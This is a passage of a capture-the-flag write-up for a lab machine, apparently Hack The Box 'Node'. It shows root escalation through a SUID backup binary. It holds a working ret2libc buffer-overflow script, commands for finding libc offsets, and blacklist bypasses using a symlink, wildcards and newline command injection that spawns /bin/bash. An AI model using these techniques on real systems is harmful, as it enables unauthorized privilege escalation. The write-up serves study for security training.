src="images/827-10.png"/><br/><br/><img alt="images/827-11.png" src="images/827-11.png"/><br/><br/>...oof trollface'd<br/></div>
<div class="page" id="badchars"><h1><b><u>badchars</u></b></h1><span style="color:#24ff00;">time to check out the backup in </span><span style="color:#ffa500;">/usr/local/bin/backup</span><br/><br/><img alt="images/825-1.png" src="images/825-1.png"/><span style="color:#24ff00;"><br/>seems we can't view it, so lets </span><span style="color:#ffa500;">netcat</span><span style="color:#24ff00;"> the </span><span style="color:#ffa500;">base64</span><span style="color:#24ff00;"> of it back to our attacking machine and name it backup<br/><br/>theres a blacklist associated with this file by looking at binary ninja (</span><span style="color:#ffff00;">ippsec</span><span style="color:#24ff00;">) there are a list of bad characters that auto-outputs a troll face if we try to look at root.txt<br/></span><a href="https://www.youtube.com/watch?v=sW10TlZF62w&amp;t=48m">https://www.youtube.com/watch?v=sW10TlZF62w&amp;t=48m</a><span style="color:#24ff00;"><br/><br/><br/></span><span style="color:#ffff00;">ippsec</span><span style="color:#24ff00;"> went through each check on bad characters by checking their respective hex formats and made the same list as below, heres what each bad char block looked like:<br/></span><img alt="images/825-2.png" src="images/825-2.png"/><br/>;" is our bad character in this block<br/><img alt="images/825-3.png" src="images/825-3.png"/><br/><br/><span style="color:#24ff00;">after going through every bad character block wihtin the process, these are the characters that will trigger the </span><span style="color:#ff0000;">trollface</span><br/><img alt="images/825-4.png" src="images/825-4.png"/><br/><span style="color:#ffff00;">badcharacters</span><span style="color:#24ff00;"> are </span><span style="color:#ffa500;">/root ; &amp; ' $ /etc // /</span><br/><br/><br/><br/><br/></div>
<div class="page" id="intended privesc- Buffer Overflow"><h1><b><u>intended privesc- Buffer Overflow</u></b></h1><span style="color:#24ff00;">to be added when I know wtf im doing<br/>okay a few hours later and I'm feeling at least confident enough to follow ippsec's walkthrough, fyi my butt is fully clenched<br/><br/>lets fire up gdb (btw install </span><span style="color:#ffa500;">PEDA - Python Exploit Development Assistance</span><span style="color:#24ff00;"> for GDB first through this link  <br/></span><a href="https://github.com/longld/peda">https://github.com/longld/peda</a><span style="color:#24ff00;"> ) <br/><br/></span><strong><span style="color:#24ff00;">NOTE</span></strong><span style="color:#24ff00;">: you need to create the a file in </span><span style="color:#ffa500;">/etc/myplace/keys</span><span style="color:#24ff00;"> with one of the 3 backup keys in order for</span><span style="color:#ffa500;"> ./backup </span><span style="color:#24ff00;">to run propely on the attacking machine because it uses that directory in the source code, and you need to be able to run ./backup on your attacking machine in order to pull the overflow off through GDB<br/><br/>(lets swap our local key file to have a short string like </span><span style="color:#ffff00;">abc</span><span style="color:#24ff00;"><br/></span><img alt="images/838-1.png" src="images/838-1.png"/><br/><img alt="images/838-2.png" src="images/838-2.png"/><br/><br/><img alt="images/838-3.png" src="images/838-3.png"/><br/><img alt="images/838-4.png" src="images/838-4.png"/><br/><br/>first order of business is to check which compile-time protections are enabled:<br/><span style="color:#ffa500;">checksec</span><br/><img alt="images/838-5.png" src="images/838-5.png"/><br/><br/>lets delete any breakpoints<br/><img alt="images/838-6.png" src="images/838-6.png"/>...none were placed but its good to check<br/><br/><br/>and put a breakpoint on main:<br/>looking at binary ninja, we find <span style="color:#ffff00;">strcopy</span><span style="color:#24ff00;">, which is an outdated function and should actually be strncopy <br/>we'll pick a function that calls </span><span style="color:#ffff00;">strcopy</span><span style="color:#24ff00;"> to target<br/></span><img alt="images/838-7.png" src="images/838-7.png"/><br/><br/>there's a function right before it so lets run our backup script twice to see if it will display what we're archiving and prove it overflows<br/><img alt="images/838-8.png" src="images/838-8.png"/><br/><br/><br/><br/><br/><br/><br/><br/></div>
<div class="page" id="check for overflowed buffer"><h1><b><u>check for overflowed buffer</u></b></h1><span style="color:#24ff00;">heading back to our bash terminal <br/><br/>because we see the computer screen output along with the text of the strcopy we want to overflow, we can tell this is vulnerable as long as we sub -</span><span style="color:#ffa500;">q</span><span style="color:#24ff00;"> out with anything </span><br/><img alt="images/841-1.png" src="images/841-1.png"/></div>
<div class="page" id="pattern create"><h1><b><u>pattern create</u></b></h1><span style="color:#24ff00;">lets throw a pattern'd string to </span><span style="color:#ffa500;">strcopy</span><span style="color:#24ff00;"> to narrow down where the </span><span style="color:#ffa500;">EIP</span><span style="color:#24ff00;"> or </span><span style="color:#ffa500;">extended instruction pointer</span><span style="color:#24ff00;"> is</span><br/><span style="color:#ffa500;">pattern create 600</span><br/><img alt="images/842-1.png" src="images/842-1.png"/><br/><span style="color:#24ff00;"><br/>now lets take the pattern and run it with arguments in gdb (abc is our local key) <br/></span><img alt="images/842-2.png" src="images/842-2.png"/><br/><br/>we see we get the trollface hexcode again, <br/><br/>a closer look shows there are badcharacters in this pattern, lets eye things out with As for now but check my buff overflow notes in TCM's overflow and there should be a way to exclude bad characters with the pattern call<br/><img alt="images/842-3.png" src="images/842-3.png"/></div>
<div class="page" id="python -c 'print &quot;A&quot;*520'"><h1><b><u>python -c 'print "A"*520'</u></b></h1><span style="color:#24ff00;">lets flood the program with a's <br/><br/></span><img alt="images/843-1.png" src="images/843-1.png"/><br/><br/><img alt="images/843-2.png" src="images/843-2.png"/><br/><br/>we see we overflowed past the eip buffer,<img alt="images/843-3.png" src="images/843-3.png"/> lets try fewer a's<br/><br/><img alt="images/843-4.png" src="images/843-4.png"/><br/><br/><img alt="images/843-5.png" src="images/843-5.png"/> <br/><span style="color:#24ff00;">no a's to be seen but we should be really close, lets add 2 a's and...<br/><br/></span><img alt="images/843-6.png" src="images/843-6.png"/><br/>we notice there are 2 "41's" which are hex for a's! which means<br/><br/>now we know the <br/>first 512 bytes are junk<br/><span style="color:#ffff00;">513-516th bit is where the eip is located!</span><span style="color:#24ff00;"><br/><br/></span><img alt="images/843-7.png" src="images/843-7.png"/><br/><br/><img alt="images/843-8.png" src="images/843-8.png"/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/></div>
<div class="page" id="buf.py"><h1><b><u>buf.py</u></b></h1><span style="color:#24ff00;">this is the code for our buffer overflow</span><br/><img alt="images/844-1.png" src="images/844-1.png"/><br/><span style="color:#24ff00;">lets swap over to our shell on </span><span style="color:#ffff00;">node</span><span style="color:#24ff00;"> and save the exploit locally</span><br/><br/><img alt="images/844-2.png" src="images/844-2.png"/><br/><span style="color:#ffa500;">from subprocess import call<br/>import struct<br/><br/>libc_base_addr = 0xb75e0000<br/><br/>system_off = 0x00040310<br/>exit_off = 0x00033260<br/>arg_off = 0x00162bac<br/><br/>system_addr = struct.pack("&lt;I",libc_base_addr+system_off)<br/>exit_addr = struct.pack("&lt;I", libc_base_addr+exit_off)<br/>arg_addr = struct.pack("&lt;I", libc_base_addr+arg_off)<br/><br/>buf = "A"*512<br/>buf += system_addr<br/>buf += exit_addr<br/>buf += arg_addr<br/><br/>i = 0<br/>while (i&lt;512):<br/>    print "Try %s" %i<br/>    i += i<br/>    ret = call(["/usr/local/bin/backup", buf])</span><br/><br/><br/></div>
<div class="page" id="find libc, system_off, exit_off and arg_off starting address"><h1><b><u>find libc, system_off, exit_off and arg_off starting address</u></b></h1><span style="color:#24ff00;">Next task is to find the memory addresses of </span><span style="color:#ffa500;">libc</span><span style="color:#24ff00;">, </span><span style="color:#ffa500;">system_off</span><span style="color:#24ff00;">, </span><span style="color:#ffa500;">exit_off </span><span style="color:#24ff00;">and </span><span style="color:#ffa500;">arg_off</span><span style="color:#24ff00;"><br/><br/></span><span style="color:#ffa500;">ldd /usr/local/bin/backup | grep libc .so.6</span><br/><img alt="images/846-1.png" src="images/846-1.png"/><br/><br/>take (<span style="color:#ffff00;">0xf75c4000</span><span style="color:#24ff00;">)<br/>and set </span><span style="color:#ffa500;">libc_base_addr </span><span style="color:#24ff00;">= </span><span style="color:#ffff00;">0xf75c4000</span><span style="color:#24ff00;"><br/><br/></span><strong><span style="color:#24ff00;">note:  the process address is randomized because of </span></strong><strong><span style="color:#ffff00;">ASLR</span></strong><br/><img alt="images/846-2.png" src="images/846-2.png"/> <br/><br/><br/>----------------------------------------------------------------------------------------------------------------------------------------------------<br/>next we need the <span style="color:#ffa500;">system_off</span><span style="color:#24ff00;"> bit address<br/><br/></span><span style="color:#ffa500;">readelf -s /lib32/libc.so.6 | grep </span><span style="color:#ffff00;">system</span><br/><img alt="images/846-3.png" src="images/846-3.png"/><br/><br/><br/>take the address of the last one <span style="color:#ffff00;"> </span><span style="color:#24ff00;"><br/>and  </span><span style="color:#ffa500;">set system_off</span><span style="color:#24ff00;"> </span><span style="color:#ffa500;">=</span><span style="color:#24ff00;"> </span><span style="color:#ffff00;">0003a940</span><br/><img alt="images/846-4.png" src="images/846-4.png"/><br/><br/><br/><br/>----------------------------------------------------------------------------------------------------------------------------------------------------<br/>next we need the <span style="color:#ffa500;">exit_off </span><span style="color:#24ff00;">address<br/></span><span style="color:#ffa500;">readelf -s /lib32/libc.so.6 | grep </span><span style="color:#ffff00;">exit</span><br/><img alt="images/846-5.png" src="images/846-5.png"/><br/><br/>take the weak one <img alt="images/846-6.png" src="images/846-6.png"/><br/>and <span style="color:#ffa500;">set exit_off = </span><span style="color:#ffff00;">0002e7d0</span><span style="color:#24ff00;"><br/><br/><br/>----------------------------------------------------------------------------------------------------------------------------------------------------<br/><br/>next we need the </span><span style="color:#ffa500;">arg_off</span><span style="color:#24ff00;"> bit address<br/>which is a little different to retrieve, <br/></span><span style="color:#ffa500;">strings -a -t x /lib32/libc.so.6 | grep bin/sh</span><br/><img alt="images/846-7.png" src="images/846-7.png"/><br/><span style="color:#ffa500;">set arg_off </span><span style="color:#24ff00;">= </span><span style="color:#ffff00;">15900b</span><span style="color:#24ff00;"><br/><br/>----------------------------------------------------------------------------------------------------------------------------------------------------<br/>given our </span><span style="color:#ffff00;">libc</span><span style="color:#24ff00;">, </span><span style="color:#ffff00;">system_off</span><span style="color:#24ff00;">, </span><span style="color:#ffff00;">exit_off</span><span style="color:#24ff00;"> and </span><span style="color:#ffff00;">arg_off</span><span style="color:#24ff00;"> memory addresses our<br/></span><span style="color:#ffa500;">buff.py </span><span style="color:#24ff00;">should look like the following:<br/><br/></span><img alt="images/846-8.png" src="images/846-8.png"/><br/><br/><br/></div>
<div class="page" id="/lib32 files"><h1><b><u>/lib32 files</u></b></h1><img alt="images/847-1.png" src="images/847-1.png"/></div>
<div class="page" id="update ret"><h1><b><u>update ret</u></b></h1><span style="color:#24ff00;">we have to modify the return function to properly run our backup process<br/><br/>which takes an arbitrary</span><span style="color:#ffa500;"> -q</span><span style="color:#24ff00;">, the </span><span style="color:#ffff00;">backup_key </span><span style="color:#24ff00;">found in</span><span style="color:#ffa500;"> /etc/myplace/keys</span><span style="color:#24ff00;"> and the </span><span style="color:#ffff00;">buffer</span><br/><br/><span style="color:#ffa500;">ret = call(["/usr/local/bin/backup" st0ve, &lt;key&gt;, buf])</span><br/><img alt="images/848-1.png" src="images/848-1.png"/><br/><span style="color:#24ff00;">now lets try this out!</span><br/></div>
<div class="page" id="run buf.py win"><h1><b><u>run buf.py win</u></b></h1><span style="color:#24ff00;">Here is our finished script<br/><br/>we have all the addresses accounted for and backup's cmd arguments in a loop, </span><br/><img alt="images/849-1.png" src="images/849-1.png"/><br/><br/><img alt="images/849-2.png" src="images/849-2.png"/><br/><br/><span style="color:#24ff00;">after some patience and many loops, we see a </span><span style="color:#ffa500;">prompt</span><span style="color:#24ff00;">:</span><br/><img alt="images/849-3.png" src="images/849-3.png"/><br/><span style="color:#24ff00;">we got </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;">!</span></div>
<div class="page" id="unintended privesc methods"><h1><b><u>unintended privesc methods</u></b></h1><span style="color:#24ff00;">By replacing some characters with wildcards, however, it is possible to evade the blacklist and grab the root flag:<br/><br/></span></div>
<div class="page" id="avoiding bad characters to extract root.txt"><h1><b><u>avoiding bad characters to extract root.txt</u></b></h1><span style="color:#24ff00;">now if we run </span><span style="color:#ffa500;">./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root</span><span style="color:#24ff00;">, we avoid any badchars and can successfully </span><span style="color:#ffff00;">extract the entire root folder</span><span style="color:#24ff00;"><br/><br/>if you go back into the / directory and call </span><br/><span style="color:#ffa500;">/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root </span><span style="color:#24ff00;"><br/><br/>you get this unintended response:<br/></span><img alt="images/828-1.png" src="images/828-1.png"/></div>
<div class="page" id="decode and unzip and...."><h1><b><u>decode and unzip and....</u></b></h1><span style="color:#24ff00;">save the incredibly long base64 string to a text file and decode it with base64</span><br/><br/><img alt="images/834-1.png" src="images/834-1.png"/><br/><span style="color:#24ff00;"><br/>we get the entire contents of </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;"> onto our machine and <br/></span><img alt="images/834-2.png" src="images/834-2.png"/><br/><br/>we get our root flag!</div>
<div class="page" id="creating a symlink"><h1><b><u>creating a symlink</u></b></h1><span style="color:#24ff00;">A </span><span style="color:#ffff00;">symbolic link </span><span style="color:#24ff00;">is a file that points to </span><span style="color:#ffa500;">another file</span><span style="color:#24ff00;">. <br/>Lets point the </span><span style="color:#ffff00;">root.txt</span><span style="color:#24ff00;"> file to a file we'll create called</span><span style="color:#ffff00;"> alt-file.txt</span><span style="color:#24ff00;">.<br/><br/><br/></span><img alt="images/836-1.png" src="images/836-1.png"/><br/><span style="color:#ffa500;">ln -s /root/root.txt altfile</span><br/><img alt="images/836-2.png" src="images/836-2.png"/><br/><br/>now we'll run backup and since altfile doesn't contain any bad characters we'll extract its backup without any problems<br/><span style="color:#ffa500;">/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 altfile</span><br/><img alt="images/836-3.png" src="images/836-3.png"/><br/><br/><br/>we can pipe the <span style="color:#ffa500;">base64</span><span style="color:#24ff00;"> straight to a zip file and unzip it frm there:<br/></span><img alt="images/836-4.png" src="images/836-4.png"/><br/><img alt="images/836-5.png" src="images/836-5.png"/><br/><br/></div>
<div class="page" id="wildcards"><h1><b><u>wildcards</u></b></h1><span style="color:#24ff00;">we see that astericks aren't filtered as bad characters, we can sub them in for o's</span><br/><br/><span style="color:#ffa500;">/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt</span><br/><img alt="images/837-1.png" src="images/837-1.png"/><br/><br/><span style="color:#24ff00;">this is the same </span><span style="color:#ffa500;">base64</span><span style="color:#24ff00;"> output from our symlink which will decode to our </span><span style="color:#ffff00;">root flag</span></div>
<div class="page" id="command injection"><h1><b><u>command injection</u></b></h1><span style="color:#24ff00;">theres a way to take advantage of the printf function to bypass the badcharacter blacklist<br/><br/>NRPE had this same vulnerability and was famous for it</span><br/><img alt="images/839-1.png" src="images/839-1.png"/><br/><br/><span style="color:#24ff00;">simply put if you call </span><span style="color:#ffa500;">backup</span><span style="color:#24ff00;"> with an </span><span style="color:#ffff00;">unclosed quoted argument</span><span style="color:#24ff00;">, you can </span><span style="color:#ffa500;">inject</span><span style="color:#24ff00;"> a </span><span style="color:#ffa500;">bash shell </span><span style="color:#24ff00;">before you close the next quote</span><br/><br/><span style="color:#ffa500;">/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 altfile </span><span style="color:#ffff00;">"</span><span style="color:#ffa500;">asd <br/>&gt;/bin/bash<br/>&gt;asd</span><span style="color:#ffff00;">"</span><br/><img alt="images/839-2.png" src="images/839-2.png"/><br/><img alt="images/839-3.png" src="images/839-3.png"/><br/><img alt="images/839-4.png" src="images/839-4.png"/><br/><br/><span style="color:#24ff00;">you can also do this with </span><span style="color:#ffa500;">printf</span> <span style="color:#24ff00;">as the directory argument<br/></span><span style="color:#ffa500;">$(printf aaa\n/bin/sh\nasd')" </span><span style="color:#24ff00;">to add the </span><span style="color:#ffa500;">\n </span><span style="color:#24ff00;">line breaks in one line </span><br/><img alt="images/839-5.png" src="images/839-5.png"/><br/><br/><br/><br/><br/><br/><br/><br/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/826-1.png" src="images/826-1.png"/><span style="color:#ffff00;"><br/>e1156acc3574e04b06908ecf76be91b1<br/><br/></span><img alt="images/826-2.png" src="images/826-2.png"/><br/>1722e99ca5f353b362556a62bd5e6be0</div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/1974-1.png" src="images/1974-1.png"/></div>
</div></body></html>